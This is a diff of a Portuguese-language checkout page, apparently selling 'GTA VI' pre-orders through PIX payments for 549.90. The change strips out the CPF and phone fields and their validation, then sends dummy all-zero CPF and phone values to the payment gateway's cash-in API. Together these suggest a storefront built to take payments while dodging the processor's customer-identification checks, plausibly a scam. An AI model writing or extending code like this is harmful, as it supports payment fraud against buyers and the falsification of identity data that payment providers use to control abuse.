@@ -415,14 +415,7 @@ body {
       <label for="email">E-mail</label>
       <input type="email" id="email" placeholder="seu@email.com" required autocomplete="email">
     </div>
-    <div class="form-group">
-      <label for="cpf">CPF</label>
-      <input type="text" id="cpf" placeholder="000.000.000-00" required inputmode="numeric" maxlength="14">
-    </div>
-    <div class="form-group">
-      <label for="phone">Telefone</label>
-      <input type="tel" id="phone" placeholder="(51) 12345-6789" required inputmode="numeric" maxlength="15">
-    </div>
+
     <button type="submit" class="btn-pay" id="btnPay">
       <span id="btnText">GERAR PIX PARA PAGAMENTO</span>
     </button>
@@ -470,27 +463,11 @@ async function getToken() {
   return data.access_token;
 }
 
-function maskCPF(v) {
-  return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
-}
-
-function maskPhone(v) {
-  return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{4,5})(\d{4})$/,'$1-$2');
-}
-
-document.getElementById('cpf').addEventListener('input', function(){
-  this.value = maskCPF(this.value);
-});
-
-document.getElementById('phone').addEventListener('input', function(){
-  this.value = maskPhone(this.value);
-});
-
-async function createPixCashin(name, email, cpf, phone, amount) {
+async function createPixCashin(name, email, amount) {
   const body = {
     amount: amount,
     description: 'GTA VI - Pré-encomenda',
-    client: { name, email, cpf: cpf.replace(/\D/g,''), phone: phone.replace(/\D/g,'') }
+    client: { name, email, cpf: '00000000000', phone: '00000000000' }
   };
   const res = await fetch(`${API_BASE}/cash-in`, {
     method: 'POST',
@@ -514,17 +491,15 @@ document.getElementById('checkoutForm').addEventListener('submit', async (e) => 
   const btnText = document.getElementById('btnText');
   const name = document.getElementById('name').value.trim();
   const email = document.getElementById('email').value.trim();
-  const cpf = document.getElementById('cpf').value.trim();
-  const phone = document.getElementById('phone').value.trim();
 
-  if (!name || !email || !cpf || !phone) return;
+  if (!name || !email) return;
 
   btn.disabled = true;
   btnText.innerHTML = '<span class="loading"></span> Gerando PIX...';
 
   try {
     accessToken = await getToken();
-    const result = await createPixCashin(name, email, cpf, phone, 549.90);
+    const result = await createPixCashin(name, email, 549.90);
 
     document.getElementById('pixCodeText').textContent = result.pix_code;
 
